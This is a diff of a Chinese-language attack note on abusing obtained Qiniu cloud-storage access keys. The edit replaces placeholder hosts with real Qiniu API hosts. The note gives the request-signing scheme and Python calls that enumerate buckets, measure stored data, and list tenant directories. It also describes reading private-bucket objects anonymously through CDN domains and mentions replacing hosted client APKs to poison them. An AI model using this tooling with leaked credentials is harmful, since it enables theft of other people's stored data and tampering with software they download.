@@ -15,7 +15,7 @@
 
 ## 描述
 
-拿到七牛 AK/SK 后：①QBox 签名规则是 urlsafe_b64(HMAC-SHA1(SK, "<path>[?<sorted_query>]\n"))，不含 HTTP 方法，带 GET 会 BadToken，urlsafe_base64 必须保留 '='；②/buckets、/bucket/<b> 取 private；③api.qiniu.com /v6/space 与 /v6/count（必带 begin/end/g=day）可直接给出精确存储字节数与对象数，是量化影响最快的接口；④rsf.target468.example.com /list 支持 prefix/delimiter/marker，delimiter=/ 拿租户目录；⑤public=0 的桶可用绑定 CDN 域匿名 GET 任意 key；⑥若同账号桶承载客户端 APK，即具备替换投毒面（需写权限）。
+拿到七牛 AK/SK 后：①QBox 签名规则是 urlsafe_b64(HMAC-SHA1(SK, "<path>[?<sorted_query>]\n"))，不含 HTTP 方法，带 GET 会 BadToken，urlsafe_base64 必须保留 '='；②/buckets、/bucket/<b> 取 private；③api.qiniu.com /v6/space 与 /v6/count（必带 begin/end/g=day）可直接给出精确存储字节数与对象数，是量化影响最快的接口；④rsf.qbox.me /list 支持 prefix/delimiter/marker，delimiter=/ 拿租户目录；⑤public=0 的桶可用绑定 CDN 域匿名 GET 任意 key；⑥若同账号桶承载客户端 APK，即具备替换投毒面（需写权限）。
 
 ## 用法
 
@@ -44,7 +44,7 @@ print(api("GET","https://rs.qiniu.com","/bucket/"+B).text)              # privat
 print(api("GET","https://api.qiniu.com","/v6/count",{"bucket":B,"begin":"2026-10-18","end":"2026-10-20","g":"day"}).text)
 print(api("GET","https://api.qiniu.com","/v6/space",{"bucket":B,"begin":"2026-10-18","end":"2026-10-20","g":"day"}).text)
 print(api("GET","https://api.qiniu.com","/v6/domain/list",{"tbl":B}).text)
-print(api("GET","https://target465.example.com","/list",{"bucket":B,"delimiter":"/","limit":1000}).text[:800])
+print(api("GET","https://rsf.qbox.me","/list",{"bucket":B,"delimiter":"/","limit":1000}).text[:800])
 # 匿名读（无需任何凭据）：https://<绑定CDN域>/<key>
 print(requests.get("https://<cdn-domain>/"+"/".join(["<tenant>","wx","<date>","<uuid>.png"]), timeout=60).status_code)
 # 写/删（有权限时）：upload_token policy {"scope": B+":"+key, "deadline": now+3600}
